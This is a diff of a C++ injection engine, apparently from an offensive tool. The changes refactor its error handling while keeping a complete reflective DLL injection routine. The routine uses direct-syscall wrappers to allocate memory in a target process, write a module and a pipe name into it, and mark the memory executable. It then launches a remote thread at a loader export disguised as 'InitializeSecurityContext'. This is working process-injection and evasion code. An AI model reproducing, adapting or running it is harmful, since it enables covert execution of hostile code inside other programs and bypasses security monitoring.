@@ -1,29 +1,33 @@
 // InjectionEngine.cpp - Low-level PE injection and execution
 #include "InjectionEngine.h"
+#include "RuntimeSupport.h"
 #include "syscalls.h"
-#include <fstream>
-#include <stdexcept>
+#include <utility>
 
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
 
-extern std::string g_securityModulePath;
-
 // Constructor initializes injection context
-InjectionManager::InjectionManager(TargetProcess& target, const Console& console) 
-    : m_target(target), m_console(console) {}
+InjectionManager::InjectionManager(TargetProcess& target, const Console& console,
+                                   std::wstring securityModulePath)
+    : m_target(target), m_console(console), m_securityModulePath(std::move(securityModulePath)) {}
 
 // Main injection workflow execution
-void InjectionManager::execute(const std::wstring& pipeName)
+bool InjectionManager::execute(const std::wstring& pipeName, std::string& error)
 {
-    m_console.Debug("Loading security module from file: " + g_securityModulePath);
-    loadSecurityModuleFromFile(g_securityModulePath);
+    m_console.Debug("Loading security module from file: " +
+                    Utils::WStringToUtf8(m_securityModulePath));
+    if (!loadSecurityModuleFromFile(error))
+        return false;
 
     m_console.Debug("Parsing module PE headers for InitializeSecurityContext entry point.");
     DWORD rdiOffset = getInitializeSecurityContextOffset();
     if (rdiOffset == 0)
-        throw std::runtime_error("Could not find InitializeSecurityContext export in security module.");
+    {
+        error = "Could not find InitializeSecurityContext export in security module.";
+        return false;
+    }
     m_console.Debug("InitializeSecurityContext found at file offset: " + Utils::PtrToHexStr((void*)(uintptr_t)rdiOffset));
 
     m_console.Debug("Allocating memory for security module in target process.");
@@ -35,7 +39,10 @@ void InjectionManager::execute(const std::wstring& pipeName)
     NTSTATUS status = NtAllocateVirtualMemory_syscall(m_target.getProcessHandle(), &remoteModuleBase, 0,
                                                     &totalAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!NT_SUCCESS(status))
-        throw std::runtime_error("NtAllocateVirtualMemory failed: " + Utils::NtStatusToString(status));
+    {
+        error = "NtAllocateVirtualMemory failed: " + Utils::NtStatusToString(status);
+        return false;
+    }
     m_console.Debug("Combined memory for module and parameters allocated at: " + Utils::PtrToHexStr(remoteModuleBase));
     
     m_console.Debug("Writing security module to target process memory.");
@@ -43,47 +50,61 @@ void InjectionManager::execute(const std::wstring& pipeName)
     status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remoteModuleBase,
                                         m_moduleBuffer.data(), moduleSize, &bytesWritten);
     if (!NT_SUCCESS(status))
-        throw std::runtime_error("NtWriteVirtualMemory for security module failed: " + Utils::NtStatusToString(status));
+    {
+        error = "NtWriteVirtualMemory for security module failed: " +
+                Utils::NtStatusToString(status);
+        return false;
+    }
 
     m_console.Debug("Writing pipe name parameter into the same allocation.");
     LPVOID remotePipeNameAddr = reinterpret_cast<PBYTE>(remoteModuleBase) + moduleSize;
     status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remotePipeNameAddr,
                                         (PVOID)pipeName.c_str(), pipeNameByteSize, &bytesWritten);
     if (!NT_SUCCESS(status))
-        throw std::runtime_error("NtWriteVirtualMemory for pipe name failed: " + Utils::NtStatusToString(status));
+    {
+        error = "NtWriteVirtualMemory for pipe name failed: " +
+                Utils::NtStatusToString(status);
+        return false;
+    }
     
     m_console.Debug("Changing module memory protection to executable.");
     ULONG oldProtect = 0;
     status = NtProtectVirtualMemory_syscall(m_target.getProcessHandle(), &remoteModuleBase,
                                           &totalAllocationSize, PAGE_EXECUTE_READ, &oldProtect);
     if (!NT_SUCCESS(status))
-        throw std::runtime_error("NtProtectVirtualMemory failed: " + Utils::NtStatusToString(status));
+    {
+        error = "NtProtectVirtualMemory failed: " + Utils::NtStatusToString(status);
+        return false;
+    }
 
-    startSecurityThreadInTarget(remoteModuleBase, rdiOffset, remotePipeNameAddr);
+    if (!startSecurityThreadInTarget(remoteModuleBase, rdiOffset, remotePipeNameAddr, error))
+        return false;
     m_console.Debug("New thread created for security module. Main thread remains suspended.");
+    return true;
 }
 
 // Reads DLL file into memory buffer
-void InjectionManager::loadSecurityModuleFromFile(const std::string& modulePath)
+bool InjectionManager::loadSecurityModuleFromFile(std::string& error)
 {
-    if (!fs::exists(modulePath))
-        throw std::runtime_error("Security module not found: " + modulePath);
+    const std::string displayPath = Utils::WStringToUtf8(m_securityModulePath);
+    if (!kvc::paths::FileExists(m_securityModulePath))
+    {
+        error = "Security module not found: " + displayPath;
+        return false;
+    }
 
-    std::ifstream file(modulePath, std::ios::binary);
-    if (!file)
-        throw std::runtime_error("Failed to open security module: " + modulePath);
+    if (!kvc::io::ReadAllBytes(m_securityModulePath, m_moduleBuffer))
+    {
+        error = "Failed to read security module: " + displayPath;
+        return false;
+    }
 
-    file.seekg(0, std::ios::end);
-    auto fileSize = file.tellg();
-    file.seekg(0, std::ios::beg);
-
-    m_moduleBuffer.resize(static_cast<size_t>(fileSize));
-    file.read(reinterpret_cast<char*>(m_moduleBuffer.data()), fileSize);
-
-    if (!file)
-        throw std::runtime_error("Failed to read security module: " + modulePath);
-
-    m_console.Debug("Loaded " + std::to_string(m_moduleBuffer.size()) + " bytes from " + modulePath);
+    std::string message = "Loaded ";
+    kvc::text::AppendUnsigned(message, m_moduleBuffer.size());
+    message.append(" bytes from ");
+    message.append(displayPath);
+    m_console.Debug(message);
+    return true;
 }
 
 // Manually parses PE export table to locate entry point
@@ -138,7 +159,8 @@ DWORD InjectionManager::getInitializeSecurityContextOffset()
 }
 
 // Creates remote thread at calculated entry point
-void InjectionManager::startSecurityThreadInTarget(PVOID remoteModuleBase, DWORD rdiOffset, PVOID remotePipeNameAddr)
+bool InjectionManager::startSecurityThreadInTarget(PVOID remoteModuleBase, DWORD rdiOffset,
+                                                   PVOID remotePipeNameAddr, std::string& error)
 {
     m_console.Debug("Creating new thread in target to execute InitializeSecurityContext.");
 
@@ -151,7 +173,11 @@ void InjectionManager::startSecurityThreadInTarget(PVOID remoteModuleBase, DWORD
     UniqueHandle remoteThreadGuard(hRemoteThread);
 
     if (!NT_SUCCESS(status))
-        throw std::runtime_error("NtCreateThreadEx failed: " + Utils::NtStatusToString(status));
+    {
+        error = "NtCreateThreadEx failed: " + Utils::NtStatusToString(status);
+        return false;
+    }
 
     m_console.Debug("Successfully created new thread for security module.");
+    return true;
 }
